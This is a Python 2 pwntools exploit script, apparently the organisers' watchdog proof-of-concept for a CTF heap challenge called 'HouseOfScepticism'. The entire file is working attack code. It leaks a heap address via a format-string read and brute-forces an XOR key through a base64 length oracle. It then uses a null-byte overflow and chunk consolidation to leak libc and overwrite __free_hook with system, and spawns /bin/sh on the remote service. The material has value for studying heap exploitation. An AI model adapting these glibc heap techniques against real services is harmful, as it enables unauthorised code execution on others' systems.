#!/usr/bin/python2
# Author: Sceptic
# Packages: pip install pwntools && pip install parse
# Timeout: 180 Seconds
# Interval: 5 Minutes
# Host: flatearth.fluxfingers.net
# Port: 1748
# Files: ./libc.so.6 in cwd

"""
Our watchdog POC exploit script which ran during the CTF periodically to make sure
services keep running. Not the prettiest, but fills the void of currently not
available writeups on ctftime. :-)
"""

from pwn import *
from sys import argv
from parse import parse
from base64 import b64encode
interactive=True

if len(argv)==3:
	HOST = argv[1]
	PORT = int(argv[2])
else:
	HOST = "ubuntu"
	PORT = 4444

libc = ELF("libc.so.6")

# XXX: This may change based on libc used
OFFSET_MALLOC_HOOK_UNORDERED_BIN = 0x68

"""
========
1. Add
2. Correct
3. Read
4. Scratch
5. Exit
"""

TOKEN_MENU = "======"
fmt_base64 = "#.64"


def recv_prompt(dbg=False):
	a = r.recvuntil("\n> ")
	if dbg:
		print(a)
	return a

def add(r,size, content, subject=None, pw="\0"):
	# menu
	recv_prompt()
	r.sendline("1")
	# content size?
	recv_prompt()
	r.sendline("{:d}".format(size))
	# want to set subject?
	recv_prompt()
	r.sendline("y" if subject is not None else "n")
	
	if subject is not None:
		# subject?
		recv_prompt()
		r.send(subject)

	# content
	recv_prompt()
	r.send(xor(content, pw))
	r.recvuntil("uccess")


def edit(r,index, start, size, payload, pw="\0"):
	# menu
	recv_prompt()
	r.sendline("2")

	# index?
	recv_prompt()
	r.sendline(str(index))

	# offset?
	recv_prompt()
	r.sendline("{:d}".format(start))

	# how much?
	recv_prompt()
	r.sendline("{:d}".format(size))

	# edit now!
	recv_prompt()
	r.send(xor(payload, pw))
	r.recvuntil("uccess")

def read(r, index, fmt=""):
	# menu
	recv_prompt()
	
	r.sendline("3")

	# index?
	recv_prompt()
	r.sendline(str(index))

	# fmt
	recv_prompt()
	r.sendline(fmt)

	if fmt != "":
		# modifiers inclu/w==dedsubject
		subject = None
		content = r.recvuntil("\n"+TOKEN_MENU)[:-len(TOKEN_MENU)-1]
	else:
		# normal printing
		subject, content, _ = parse("Subject: {}\nContents: {}\n{}", r.recvuntil(TOKEN_MENU))
		
	return subject, content

vals = {'A': 0, 	'Q': 16, 	'g': 32, 	'w': 48,
		'B': 1, 	'R': 17, 	'h': 33, 	'x': 49,
		'C': 2, 	'S': 18, 	'i': 34, 	'y': 50,
		'D': 3, 	'T': 19, 	'j': 35, 	'z': 51,
		'E': 4, 	'U': 20, 	'k': 36, 	'0': 52,
		'F': 5, 	'V': 21, 	'l': 37, 	'1': 53,
		'G': 6, 	'W': 22, 	'm': 38, 	'2': 54,
		'H': 7, 	'X': 23, 	'n': 39, 	'3': 55,
		'I': 8, 	'Y': 24, 	'o': 40, 	'4': 56,
		'J': 9, 	'Z': 25, 	'p': 41, 	'5': 57,
		'K': 10, 	'a': 26, 	'q': 42, 	'6': 58,
		'L': 11, 	'b': 27, 	'r': 43, 	'7': 59,
		'M': 12, 	'c': 28, 	's': 44, 	'8': 60,
		'N': 13, 	'd': 29, 	't': 45, 	'9': 61,
		'O': 14, 	'e': 30, 	'u': 46, 	'+': 62,
		'P': 15, 	'f': 31, 	'v': 47, 	'/': 63}

masks = [
	int("111111", 2),
	int("001111", 2),
	int("000011", 2),
	int("111111", 2)
]

def b64_len_sufficient(ind, b64):
	if len(b64)<=ind or b64[ind]=="=":
		return False
	elif ind == 3:
		return True
	else:
		if (vals[b64[ind]] & masks[ind]) != 0 or b64[ind+1]!="=":
			#print("Got successful mask comparison ind: {}, b64: {}\nb64[ind]={}, masks[ind]={}, vals[b64[ind]]={}".format(ind, b64, b64[ind], bin(masks[ind]), bin(vals[b64[ind]])))
			return True
		else:
			return False


def leak_b64_pw_block(curr_pw):
	assert(len(curr_pw) % 4 == 0)
	base_pl = xor(curr_pw, len(curr_pw)*"/")
	base_out_len = len(curr_pw)
	block = ""

	num_requests = 0
	for cnt in range(4):
		char_done = False
		known_len = base_out_len+len(block)
		for i in range(0, 256, 16):
			if char_done:
				break
			for j in range(0, 256, 16):
				num_requests+=1
				pl = base_pl + xor(block, len(block)*"/")
				pl += chr(i)
				pl += chr(j)
				pl = pl.ljust(15, "\0")
				edit(r,0, 0, len(pl)+1, pl)
				_, content = read(r, 0, fmt_base64)
				b64 = b64encode(content)
				#print("Got [i: {}, j: {}]: {}".format(i, j, b64))
				if b64_len_sufficient(cnt, b64[len(curr_pw):]):
					b64_char = b64[known_len]
					key_byte = ord(b64_char)^i
					#print("Got hit for i: {:02x}, j: {:02x}: {} [{}]".format(i, j, content.encode("hex"), b64))
					#print("Recovered key byte: {:02x} for pl: {}, b64: {}, content: {}".format(key_byte, pl[len(curr_pw):].encode("hex"), b64, content[(len(curr_pw)//4)*3:].encode("hex")))
					block += chr(key_byte)
					char_done = True
					break
				elif cnt==3:
					# don't run inner loop multiple times
					break
	print("Used number of requests: {}".format(num_requests))

	return block

def leak_pw():
	res = ""

	res += leak_b64_pw_block(res)
	res += leak_b64_pw_block(res)	
        if interactive:
            print("Recovered pw: {}".format(res.encode("hex")))
	return res

SIZEOF_SUBJECT = 16
SIZEOF_ENTRY = 8 + SIZEOF_SUBJECT #sizeof(size_t) + sizeof(subject)
FIRST_SIZE = 248-SIZEOF_ENTRY
FIRST_FASTCHUNK_SIZE = 32
FASTBIN_CHUNK_SIZE = 64
DELIMITER_CHUNK_SIZE = SIZEOF_ENTRY+8+16
assert(DELIMITER_CHUNK_SIZE%16 == 0)
VICTIM_BUF_SIZE = 0x100-8-SIZEOF_ENTRY+32

MAX_TRIES = 5
for try_num in range(MAX_TRIES):
    with remote(HOST, PORT) as r:
        try:
            add(r,FIRST_SIZE-1, 32*"A", "MySubject")
            subject, content = read(r, 0, "llo")
            if interactive:
                print("Got leak content: {} [{}]".format(content, content.encode("hex")))
            leak = parse("{:o}B", content)[0]
            victim_start = leak + FIRST_SIZE + SIZEOF_ENTRY - 8 + FIRST_FASTCHUNK_SIZE + DELIMITER_CHUNK_SIZE + FASTBIN_CHUNK_SIZE
            if interactive:
                print("Got leak: {:016x}, victim start: {:016x}".format(leak, victim_start))

            # Create smallbin chunk used for leaking the b64 key
            pl = 16*"\0"
            edit(r,0, 0, len(pl), pl)
            read(r, 0, fmt_base64)

            pw = leak_pw()

            # Create buffering chunk to protect from forward-consolidation between fastbin chunks
            add(r,DELIMITER_CHUNK_SIZE-SIZEOF_ENTRY-8-1, "PAD", "PAD", pw=pw)


            # Prepare fastbin chunk to exist before victim
            pl = b64encode(55*"A").rstrip("=")+"\0"
            edit(r,0, 0, len(pl), pl, pw=pw)
            read(r, 0, fmt_base64)
            # Set up nextchunk(victim)->prev_size to truncated size by null-byte-overflow
            add(r,VICTIM_BUF_SIZE-1, (0x100-8-SIZEOF_ENTRY-8)*"B"+p64(0x100)+8*"\0", (2*p64(victim_start))[:-1], pw=pw)

            # Trigger fastbin null byte overflow
            pl = b64encode(56*"A").rstrip("=")+"\0"
            edit(r,0, 0, len(pl), pl, pw=pw)
            read(r, 0, fmt_base64)

            # Allocate/Deallocate for malloc_consolidate
            pl = b64encode(128*"T")
            edit(r,0, 0, len(pl), pl, pw=pw)
            read(r, 0, fmt_base64)

            # Allocate overlapping buffer by exact size match
            consolidated_size = FASTBIN_CHUNK_SIZE + 0x100
            overflow_entry_bufsize_choice = consolidated_size - SIZEOF_ENTRY - 1 - 8
            overflow_entry_buf_padsize = (FASTBIN_CHUNK_SIZE-SIZEOF_ENTRY)
            overflow_entry_pl = overflow_entry_buf_padsize*"O"+"overflown subj".ljust(16,"\0")+p64(0xffffffffffffffff)+"woop woop"
            add(r,overflow_entry_bufsize_choice, overflow_entry_pl, "A", pw=pw)

            # Leak libc address
            # a) setup malloc_consolidate to place unsorted_start in buffer
            if interactive:
                raw_input("cause second consolidate...")
            fastbin1_create_pl = b64encode(64*"A")+"\x00" # for 80 byte allocation
            fastbin2_create_pl = b64encode(32*"A")+"\x00" # for 48 byte allocation
            consolidated_fastbin_size = 80+48
            edit(r,0, 0, len(fastbin1_create_pl), fastbin1_create_pl, pw=pw)
            read(r, 0, fmt_base64)
            edit(r,0, 0, len(fastbin2_create_pl), fastbin2_create_pl, pw=pw)
            read(r, 0, fmt_base64)
            add(r,128, 16*"D", "delim 2", pw=pw)
            smallbin_create_pl = b64encode(128*"A")+"\0"
            edit(r,0, 0, len(smallbin_create_pl), smallbin_create_pl, pw=pw)
            read(r, 0, fmt_base64)
            # b) edit victim chunk to enable leak (set size for the decoding to eliminate terminating nullbytes)
            if interactive:
                raw_input("leak...")
            overflow_to_VICTIM_BUF_SIZE_offset = overflow_entry_buf_padsize + SIZEOF_SUBJECT
            victim_set_pl = p64(VICTIM_BUF_SIZE+8)
            edit(r,3, overflow_to_VICTIM_BUF_SIZE_offset, len(victim_set_pl), victim_set_pl, pw=pw)
            victim_fill_pl = (VICTIM_BUF_SIZE+8)*"F"
            edit(r,2, 0, len(victim_fill_pl), victim_fill_pl)
            subject, content = read(r, 2)
            leak = u64(content[len(victim_fill_pl):]+"\0\0") 

            # c) calculate addr
            libc_base = leak - OFFSET_MALLOC_HOOK_UNORDERED_BIN - libc.symbols["__malloc_hook"]
            if interactive:
                print("Got libc leak: {:016x}, libc base: {:016x}".format(leak, libc_base))
            system = libc_base + libc.symbols['system']
            free_hook = libc_base + libc.symbols['__free_hook']
            if interactive:
                print("Got system: {:016x}, __free_hook: {:016x}".format(system, free_hook))


            # Use arb write to override __free_hook with system
            # a) set sizes of victim and consolidated chunk
            edit(r,3, overflow_to_VICTIM_BUF_SIZE_offset, 8, p64(0xffffffffffffffff), pw=pw)
            edit(r,2, VICTIM_BUF_SIZE, 8, p64(consolidated_fastbin_size|1), pw=pw) 

            # b) calculate offset and override
            victim_buf_start = victim_start + 16 + SIZEOF_ENTRY
            offset_victim_buf_free_hook = free_hook - victim_buf_start
            if interactive:
                print("Got victim buf start: {:016x}, offset from victim buf to free_hook: {:016x}".format(victim_buf_start, offset_victim_buf_free_hook))
            edit(r,2, offset_victim_buf_free_hook, 8, p64(system), pw=pw)

            cmd = b64encode("/bin/sh\0")
            edit(r,0, 0, len(cmd), cmd, pw=pw)

            # Base64 print buffer to get free on cmd
            # menu
            recv_prompt()
            r.sendline("3")

            # index?
            recv_prompt()
            r.sendline("0")

            # fmt
            recv_prompt()
            r.sendline(fmt_base64)

            r.clean(1)
            CHALL = "HouseOfScepticism"
            if interactive:
                r.interactive()
            else:
                r.sendline("ls")
                answ = r.recvuntil(CHALL, timeout=2)
                if CHALL in answ:
                    print("Success")
                    exit(0)
                else:
                    print("Fail")
                    exit(-1)
        except struct.error:
            print("Struct error occurred")
            continue
        except AssertionError:
            print("Assertion error occurred")
            continue

print("Attempts exhausted")
exit(-1)
